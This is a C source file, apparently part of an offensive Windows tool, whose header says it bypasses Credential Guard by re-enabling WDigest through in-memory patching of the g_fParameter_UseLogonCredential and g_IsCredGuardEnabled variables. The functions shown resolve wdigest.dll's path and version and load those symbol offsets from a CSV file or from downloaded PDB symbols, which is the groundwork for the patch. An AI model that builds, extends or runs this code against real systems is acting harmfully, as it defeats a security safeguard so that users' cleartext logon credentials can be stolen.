/*

--- Functions to bypass Credential Guard by enabling Wdigest through patching of the g_fParameter_UseLogonCredential and g_IsCredGuardEnabled attributes in memory.
--- Full source and credit to https://teamhydra.blog/2020/08/25/bypassing-credential-guard/
--- Code adapted from: https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240

*/

#include <tchar.h>
#include <stdio.h>

#include "FileVersion.h"
#include "PdbSymbols.h"
#include "PrintFunctions.h"

#include "WdigestOffsets.h"

union WdigestOffsets g_wdigestOffsets = { 0 };

void LoadWdigestOffsetsFromFile(TCHAR* wdigestOffsetFilename) {
    LPTSTR wdigestVersion = GetWdigestVersion();
    _tprintf_or_not(TEXT("[*] System's wdigest.dll file version is: %s\n"), wdigestVersion);

    FILE* offsetFileStream = NULL;
    _tfopen_s(&offsetFileStream, wdigestOffsetFilename, TEXT("r"));

    if (offsetFileStream == NULL) {
        _putts_or_not(TEXT("[!] Offset CSV file not found / invalid. A valid offset file must be specifed!"));
        return;
    }

    TCHAR lineWdigestVersion[256];
    TCHAR line[2048];
    while (_fgetts(line, _countof(line), offsetFileStream)) {
        TCHAR* dupline = _tcsdup(line);
        TCHAR* tmpBuffer = NULL;
        _tcscpy_s(lineWdigestVersion, _countof(lineWdigestVersion), _tcstok_s(dupline, TEXT(","), &tmpBuffer));
        if (_tcscmp(wdigestVersion, lineWdigestVersion) == 0) {
            TCHAR* endptr;
            _tprintf_or_not(TEXT("[+] Offsets are available for this version of wdigest.dll (%s)!\n"), wdigestVersion);
            for (int i = 0; i < _SUPPORTED_WDIGEST_OFFSETS_END; i++) {
                g_wdigestOffsets.ar[i] = _tcstoull(_tcstok_s(NULL, TEXT(","), &tmpBuffer), &endptr, 16);
            }
            break;
        }
    }
    fclose(offsetFileStream);
}

void SaveWdigestOffsetsToFile(TCHAR* wdigestOffsetFilename) {
    LPTSTR wdigestVersion = GetWdigestVersion();

    FILE* offsetFileStream = NULL;
    _tfopen_s(&offsetFileStream, wdigestOffsetFilename, TEXT("a"));

    if (offsetFileStream == NULL) {
        _putts_or_not(TEXT("[!] Offset CSV file connot be opened"));
        return;
    }

    _ftprintf(offsetFileStream, TEXT("%s"), wdigestVersion);
    for (int i = 0; i < _SUPPORTED_WDIGEST_OFFSETS_END; i++) {
        _ftprintf(offsetFileStream, TEXT(",%llx"), g_wdigestOffsets.ar[i]);
    }
    _fputts(TEXT("\n"), offsetFileStream);

    fclose(offsetFileStream);
}


void LoadWdigestOffsetsFromInternet(BOOL delete_pdb) {
    LPTSTR wdigestPath = GetWdigestPath();
    symbol_ctx* sym_ctx = LoadSymbolsFromImageFile(wdigestPath);
    if (sym_ctx == NULL) {
        return;
    }
    g_wdigestOffsets.st.g_fParameter_UseLogonCredential = GetSymbolOffset(sym_ctx, "g_fParameter_UseLogonCredential");
    g_wdigestOffsets.st.g_IsCredGuardEnabled = GetSymbolOffset(sym_ctx, "g_IsCredGuardEnabled");
    UnloadSymbols(sym_ctx, delete_pdb);
}

TCHAR g_wdigestPath[MAX_PATH] = { 0 };
LPTSTR GetWdigestPath() {
    if (_tcslen(g_wdigestPath) == 0) {
        // Retrieves the system folder (eg C:\Windows\System32).
        TCHAR systemDirectory[MAX_PATH] = { 0 };
        GetSystemDirectory(systemDirectory, _countof(systemDirectory));

        // Compute wdigest.dll path.
        _tcscat_s(g_wdigestPath, _countof(g_wdigestPath), systemDirectory);
        _tcscat_s(g_wdigestPath, _countof(g_wdigestPath), TEXT("\\wdigest.dll"));
    }
    return g_wdigestPath;
}

TCHAR g_wdigestVersion[256] = { 0 };
LPTSTR GetWdigestVersion() {
    if (_tcslen(g_wdigestVersion) == 0) {
        LPTSTR wdigestPath = GetWdigestPath();

        TCHAR versionBuffer[256] = { 0 };
        GetFileVersion(versionBuffer, _countof(versionBuffer), wdigestPath);

        _stprintf_s(g_wdigestVersion, 256, TEXT("wdigest_%s.dll"), versionBuffer);
    }
    return g_wdigestVersion;
}